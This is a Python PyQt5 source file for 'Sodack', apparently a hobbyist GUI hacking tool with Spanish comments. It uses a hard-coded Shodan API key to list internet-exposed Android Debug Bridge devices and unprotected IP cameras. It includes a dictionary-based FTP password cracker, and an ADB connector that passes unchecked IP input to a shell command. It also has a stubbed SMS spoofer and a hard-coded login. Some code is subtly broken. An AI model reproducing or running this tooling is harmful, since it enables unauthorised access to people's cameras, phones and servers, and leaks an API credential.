#!/usr/bin/python3

# Creando sodack en modo grafico/ By R00B1N.

#importamos las librerias.
from PyQt5.QtWidgets import QMainWindow, QApplication,  QDialog, QWidget, QLineEdit
#from PyQt5.QtWebEngineWidgets import QWebEngineView
from PyQt5.QtGui import QIcon, QPixmap
from PyQt5.QtCore import QTime
from os import popen
from PyQt5 import uic
from time import sleep
import urllib.request
import pandas as pd
import subprocess
import paramiko
import shodan
import random
import ftplib
import nmap
import json
import sys


# Variable de la API_KEY.
global api
api = shodan.Shodan('jhVeQApGPvTSmjAA2cEVHAkZ9gvn5Tr0')



# Creamos la clase heredada para nuestra ventana de login.
class Login(QWidget):
	def __init__(self):
		QWidget.__init__(self)
		# Cargar la plantilla ui para nuestra ventana.
		uic.loadUi("Templates/login.ui", self)
		# titulo para nuestra ventana.
		self.setWindowTitle("Sodack by R00B1N")
		self.setMaximumSize(700, 642)
		self.setMinimumSize(700, 642)
		#asignandole funcion al boton.
		self.Botonlogin.clicked.connect(self.abrir_menu)

	def abrir_menu(self):
		if self.User.text() == "" and self.Password.text() == "":
			self.label_err.setStyleSheet("color: red;")
			self.label_err.setText("Los campos no pueden estar vacios!.")
		elif self.User.text() and self.Password.text() == "":
			self.label_err.setStyleSheet("color: red;")
			self.label_err.setText("El campo de de la key no puede estar vacio!")
		elif self.Password.text() and self.User.text() == "":
			self.label_err.setStyleSheet("color: red;")
			self.label_err.setText("El campo del usuario no puede estar vacio!")
		elif self.User.text() == "r00b1n" and self.Password.text() == "hacker22":
			self.completed = 0
			self.label_err.clear()
			while self.completed < 100:
				self.completed += 0.00003
				self.progressBar.setValue(int(self.completed))
			self.close() #cerrar la ventana de login cuando los datos son validados.
			self.inicio = Menu()
			self.inicio.show()
		else:
			self.label_err.clear()
			self.completed = 0
			while self.completed < 100:
				self.completed += 0.00003
				self.progressBar.setValue(int(self.completed))
			self.progressBar.setValue(0)
			self.label_err.setStyleSheet("color: red;")
			self.label_err.setText("Los datos introducidos son incorrectos!")




# Creando la clase para el menu.
class Menu(QMainWindow):
	def __init__(self):
		QMainWindow.__init__(self)
		# Cargar la plantilla de nuestro nivel.
		uic.loadUi("Templates/menu.ui", self)
		# Titulo de nuestra ventana.
		self.setWindowTitle("Sodack By R00B1N")
		# mostrar la plantilla en modo de pantalla completa.
		self.showMaximized()
		# Agregandole funcion a los botones.
		self.scanner.clicked.connect(self.host_scanner)
		# funcion para ek boton de host.
		#self.scanner.clicked.connect(self.close_menu)
		# funcion para los dispositivos ADB.
		self.adb.clicked.connect(self.show_me_devices)
		# funcion para las camaras.
		self.cameras.clicked.connect(self.show_me_cameras)
		# funcion para el sms spoofer.
		self.sms.clicked.connect(self.sms_spoofer)
		# funcion para el ftp.
		self.ftp.clicked.connect(self.ftp_crack)
		# funcion para el ssh.
		self.ssh.clicked.connect(self.ssh_crack)
		# funcion para el cliente adb.
		self.adb_con.clicked.connect(self.adb_conn)

	def host_scanner(self):
		self.host_scan = Host()  # Crear el objeto para instanciar la clase.
		self.host_scan.show()
	def close_menu(self):
		""" cerrar el menu """
		self.close()


	def show_me_devices(self):
		self.textBrowser.setStyleSheet("background-color: black; color: green;")
		self.textBrowser.setText("Buscando Dispositivos...\n" * 3)
		sleep(3)
		keyword = "Android Debug Bridge"
		host = []
		data = []
		try:
			results = api.search(keyword)
			x = ("Results found: {}".format(results['total']))
			for result in results['matches']:
				y = ('IP: {}'.format(result['ip_str']))
				z = (result['data'])
				host.append(y)
				data.append(z)	
				#print('')
				#print("\nPresiona enter para seguir mostrando resultados!!")
				#input()
		except shodan.APIError:
				self.textBrowser.setText("Error, Esto ha sido generado intencionalmente XD")
				#input()
				pass
		# crear nuestro dataframe con pandas.
		df = pd.DataFrame(list(zip(host, data)), columns=['Host', 'Info'])
		pd.set_option('display.max_rows', None)
		pd.set_option('display.max_columns', None)
		pd.set_option('display.width', None)
		pd.set_option('display.max_colwidth', 1)
		# imprimiendo nuestros resultados en nuestro cuadro de texto.
		self.textBrowser.setText(str(df))


	def show_me_cameras(self):
		ale = random.randint(0, 8)
		if ale == 0:
			self.textBrowser.setStyleSheet("background-color: black; color: cyan;")
			keyword = "Axis"
			camera = []
			info = []
			try:
				results = api.search(keyword)
				x = ("Results found: {}".format(results['total']))
				for result in results['matches']:
					y = ('IP: {}'.format(result['ip_str']))
					z = (result['data'])
					camera.append(y)
					info.append(z)
			except shodan.APIError:
				self.textBrowser.setText("Error")
			# crear dataframe.
			df = pd.DataFrame(list(zip(camera, info)), columns=['Camaras', 'Axis Cameras'])
			pd.set_option('display.max_rows', None)
			pd.set_option('display.max_columns', None)
			pd.set_option('display.width', None)
			pd.set_option('display.max_colwidth', 1)
			self.textBrowser.setText('Cargando...\n'*3)
			sleep(2)
			self.textBrowser.setText(str(df))
		elif ale == 1:
			self.textBrowser.setStyleSheet("background-color: black; color: cyan;")
			keyword = "ipcamera, 200"
			camera = []
			info = []
			try:
				results = api.search(keyword)
				x = ("Results found: {}".format(results['total']))
				for result in results['matches']:
					y = ('IP: {}'.format(result['ip_str']))
					z = (result['data'])
					camera.append(y)
					info.append(z)
			except shodan.APIError:
				self.textBrowser.setText("Error")
			# crear dataframe.
			df = pd.DataFrame(list(zip(camera, info)), columns=['Camaras', 'ipcamera, 200'])
			pd.set_option('display.max_rows', None)
			pd.set_option('display.max_columns', None)
			pd.set_option('display.width', None)
			pd.set_option('display.max_colwidth', 1)
			self.textBrowser.setText('Cargando...\n'*3)
			sleep(2)
			self.textBrowser.setText(str(df))
		elif ale == 2:
			self.textBrowser.setStyleSheet("background-color: black; color: cyan;")
			keyword = "Server: Camera Web Server"
			camera = []
			info = []
			try:
				results = api.search(keyword)
				x = ("Results found: {}".format(results['total']))
				for result in results['matches']:
					y = ('IP: {}'.format(result['ip_str']))
					z = (result['data'])
					camera.append(y)
					info.append(z)
			except shodan.APIError:
				self.textBrowser.setText("Error")
			# crear dataframe.
			df = pd.DataFrame(list(zip(camera, info)), columns=['Camaras', 'Camera Web Server'])
			pd.set_option('display.max_rows', None)
			pd.set_option('display.max_columns', None)
			pd.set_option('display.width', None)
			pd.set_option('display.max_colwidth', 1)
			self.textBrowser.setText('Cargando...\n'*3)
			sleep(2)
			self.textBrowser.setText(str(df))
		elif ale == 3:
			self.textBrowser.setStyleSheet("background-color: black; color: cyan;")
			keyword = "ipcam"
			camera = []
			info = []
			try:
				results = api.search(keyword)
				x = ("Results found: {}".format(results['total']))
				for result in results['matches']:
					y = ('IP: {}'.format(result['ip_str']))
					z = (result['data'])
					camera.append(y)
					info.append(z)
			except shodan.APIError:
				self.textBrowser.setText("Error")
			# crear dataframe.
			df = pd.DataFrame(list(zip(camera, info)), columns=['Camaras', 'ipcam'])
			pd.set_option('display.max_rows', None)
			pd.set_option('display.max_columns', None)
			pd.set_option('display.width', None)
			pd.set_option('display.max_colwidth', 1)
			self.textBrowser.setText('Cargando...\n'*3)
			sleep(2)
			self.textBrowser.setText(str(df))
		elif ale == 4:
			self.textBrowser.setStyleSheet("background-color: black; color: cyan;")
			keyword = "d-Link Internet Camera"
			camera = []
			info = []
			try:
				results = api.search(keyword)
				x = ("Results found: {}".format(results['total']))
				for result in results['matches']:
					y = ('IP: {}'.format(result['ip_str']))
					z = (result['data'])
					camera.append(y)
					info.append(z)
			except shodan.APIError:
				self.textBrowser.setText("Error")
			# crear dataframe.
			df = pd.DataFrame(list(zip(camera, info)), columns=['Camaras', 'D-Link Internet Camera'])
			pd.set_option('display.max_rows', None)
			pd.set_option('display.max_columns', None)
			pd.set_option('display.width', None)
			pd.set_option('display.max_colwidth', 1)
			self.textBrowser.setText('Cargando...\n'*3)
			sleep(2)
			self.textBrowser.setText(str(df))
		elif ale == 5:
			self.textBrowser.setStyleSheet("background-color: black; color: cyan;")
			keyword = 'Network Camera'
			camera = []
			info = []
			try:
				results = api.search(keyword)
				x = ("Results found: {}".format(results['total']))
				for result in results['matches']:
					y = ('IP: {}'.format(result['ip_str']))
					z = (result['data'])
					camera.append(y)
					info.append(z)
			except shodan.APIError:
				self.textBrowser.setText("Error")
			# crear dataframe.
			df = pd.DataFrame(list(zip(camera, info)), columns=['Camaras', 'Network Cameras'])
			pd.set_option('display.max_rows', None)
			pd.set_option('display.max_columns', None)
			pd.set_option('display.width', None)
			pd.set_option('display.max_colwidth', 1)
			self.textBrowser.setText('Cargando...\n'*3)
			sleep(2)
			self.textBrowser.setText(str(df))
		elif ale == 6:
			self.textBrowser.setStyleSheet("background-color: black; color: cyan;")
			keyword = 'title:"Network Camera" country:us'
			camera = []
			info = []
			try:
				results = api.search(keyword)
				x = ("Results found: {}".format(results['total']))
				for result in results['matches']:
					y = ('IP: {}'.format(result['ip_str']))
					z = (result['data'])
					camera.append(y)
					info.append(z)
			except shodan.APIError:
				self.textBrowser.setText("Error")
			# crear dataframe.
			df = pd.DataFrame(list(zip(camera, info)), columns=['Camaras', 'Network Cameras'])
			pd.set_option('display.max_rows', None)
			pd.set_option('display.max_columns', None)
			pd.set_option('display.width', None)
			pd.set_option('display.max_colwidth', 1)
			self.textBrowser.setText('Cargando...\n'*3)
			sleep(2)
			self.textBrowser.setText(str(df))
		elif ale == 7:
			self.textBrowser.setStyleSheet("background-color: black; color: cyan;")
			keyword = "Steven"
			camera = []
			info = []
			try:
				results = api.search(keyword)
				x = ("Results found: {}".format(results['total']))
				for result in results['matches']:
					y = ('IP: {}'.format(result['ip_str']))
					z = (result['data'])
					camera.append(y)
					info.append(z)
			except shodan.APIError:
				self.textBrowser.setText("Error")
			# crear dataframe.
			df = pd.DataFrame(list(zip(camera, info)), columns=['Camaras', 'Steven'])
			pd.set_option('display.max_rows', None)
			pd.set_option('display.max_columns', None)
			pd.set_option('display.width', None)
			pd.set_option('display.max_colwidth', 1)
			self.textBrowser.setText('Cargando...\n'*3)
			sleep(2)
			self.textBrowser.setText(str(df))
		elif ale == 8:
			self.textBrowser.setStyleSheet("background-color: black; color: cyan;")
			keyword = "Cam it"
			camera = []
			info = []
			try:
				results = api.search(keyword)
				x = ("Results found: {}".format(results['total']))
				for result in results['matches']:
					y = ('IP: {}'.format(result['ip_str']))
					z = (result['data'])
					camera.append(y)
					info.append(z)
			except shodan.APIError:
				self.textBrowser.setText("Error")
			# crear dataframe.
			df = pd.DataFrame(list(zip(camera, info)), columns=['Camaras', 'Open Cameras'])
			pd.set_option('display.max_rows', None)
			pd.set_option('display.max_columns', None)
			pd.set_option('display.width', None)
			pd.set_option('display.max_colwidth', 1)
			self.textBrowser.setText('Cargando...\n'*3)
			sleep(2)
			self.textBrowser.setText(str(df))
		else:
			self.textBrowser.setText("Se ha producido un error!")


	def sms_spoofer(self):
		self.textBrowser.setText("Funcionando!")


	def ftp_crack(self):
		self.fpt_win = FTP()
		self.fpt_win.show()


	def ssh_crack(self):
		pass


	def adb_conn(self):
		self.adb_c = ADB_conector()
		self.adb_c.show()



# Creando la clase para nuestra ventana de dialogo para el host.
class Host(QDialog):
	def __init__(self):
		QDialog.__init__(self)
		# Cargar la UI de la ventana de dialogo.
		uic.loadUi("Templates/host.ui", self)
		self.setWindowTitle("Host Scanner")
		self.setMaximumSize(800, 450)
		self.setMinimumSize(800, 450)
		#self.menu = Menu() #crear un objeto de nuestra clase.(pasar los datos a la clase menu)
		# Agregarle la funcion al boton del escaner.
		self.scan_host.clicked.connect(self.ip_info)

	def ip_info(self):
		self.srch = "https://ipinfo.io/"+self.ip_input.text()+"/json"
		self.url = urllib.request.urlopen(self.srch)
		self.load = json.loads(self.url.read())
		self.data = []
		for date in self.load:
			x = (self.data, '>>>>', self.load[date])
			self.data.append(x)

		# creamos una serie para mostrar nuestra salida de datos sobre la ip a escanear.
		df = pd.Series([str(self.data)], index=['Informacion sobre el Host  '])
		pd.set_option('display.max_rows', 1)
		pd.set_option('display.max_columns', 1)
		pd.set_option('display.width', 1)
		pd.set_option('display.max_colwidth', 1)
		self.outIP.setStyleSheet('background-color: #353b48; color: #fbc531;')
		self.outIP.setText(str(df).replace("([...], '>>>>'"","" ", " ""\n"))


# Clase para nuestro cracker ftp.
class FTP(QDialog):
	def __init__(self):
		QDialog.__init__(self)
		# Cargar la plantilla UI.
		uic.loadUi("Templates/ftp.ui", self)
		self.setWindowTitle("FTP Cracker")
		self.setMaximumSize(800, 450)
		self.setMinimumSize(800, 450)
		# funciones a los botones.
		self.crack.clicked.connect(self.start_cracking)


	def start_cracking(self):
		# Checkear si los campos estan vacios.
		if self.server_input.text() == "" and self.dict_input.text() == "" and self.user_input.text() == "":
			self.outCrack.setText("Los campos no pueden estar vacios!")
		elif self.server_input.text() and self.dict_input.text() and self.user_input.text() == "":
			self.outCrack.setText("El campo de Usuario no puede estar vacio!")
		elif self.server_input.text() and self.user_input.text() and self.dict_input.text() == "":
			self.outCrack.setText("El campo del diccionario no puede estar vacio!")
		elif self.server_input.text() == "" and self.dict_input.text() and self.user_input.text():
			self.outCrack.setText("El campo del Servidor o Host no puede estar vacio!")
		elif self.server_input.text() and self.user_input.text() and self.dict_input.text():
			self.outCrack.setText("Cracking...")
			sleep(4)
			with open(self.dict_input.text(), "r") as pw:
				for password in pw:
					password = password.strip('\r').strip('\n')
					try:
						# Intentamos la conexion
						self.ftp = ftplib.FTP(self.server_input.text())
						self.ftp.login(self.user_input.text(), password)
						self.outCrack.setStyleSheet("color: green;")
						self.outCrack.setText("Crackeado!... La passwd es --> ", password)
						break;
					except Exception as err:
						self.outCrack.setText("Se ha producido un error al Crackear el servidor!")


class ADB_conector(QDialog):
	def __init__(self):
		QDialog.__init__(self)
		# Cargar la plantilla UI.
		uic.loadUi("Templates/adb.ui", self)
		self.setWindowTitle("Connect to ADB Device")
		self.setMinimumSize(800, 600)
		self.setMaximumSize(800, 600)
		# Agregar funciones a los botones.
		self.connect_adb.clicked.connect(self.conexion)
		# Mostrar los dispositivos conectados.
		self.show_devices.clicked.connect(self.show_adb_devices)

	def conexion(self):
		# chequear si el campo de la IP esta vacio.
		if self.adb_ip.text() == "" and self.adb_port.text() == "":
			self.label.setText("Los campos no pueden estar vacios!")
		elif self.adb_ip.text() == "" and self.adb_port.text():
			self.label.setText("El campo de la IP no puede estar vacio!")
		elif self.adb_ip.text() and self.adb_port.text() == "":
			self.label.setText("El campo del puerto ADB no puede estar vacio!")
		elif len(self.label.text()) < 8:
			self.label.setText("La longitud de la direccion es incorrecta!")
		else:
			self.label.clear()
			self.textBrowser.setStyleSheet('color: green')
			self.textBrowser.setText("Conectando...")
			sleep(3)
			# Intentar la conexion al dispositivo.
			try:
				self.conectar = popen("adb.exe connect {}:{}".format(self.adb_ip.text(), self.adb_port.text()))
				self.textBrowser.setStyleSheet('color: lightgreen;')
				self.textBrowser.setText("Conexion Exitosa!")
				sleep(2)
				self.textBrowser.setText(self.conectar.text())
			except Exception as error:
				self.textBrowser.setStyleSheet('color: red;')
				self.textBrowser.setText("Se ha producido un error al conectar!")


	def show_adb_devices(self):
		# Check for connected devices.
		self.check = popen("adb.exe devices")
		self.textBrowser.setStyleSheet('color: lightgreen;')
		self.textBrowser.setText(self.check.read())





if __name__ == '__main__':
	#iniciar la instancia para nuestra aplicacion.
	app = QApplication(sys.argv)
	#crear un objeto para nuestra clase.
	logueo = Login()
	#mostrar nuestra aplicacion.
	logueo.show()
	#ejecutar nuestra aplicacion.
	app.exec_()
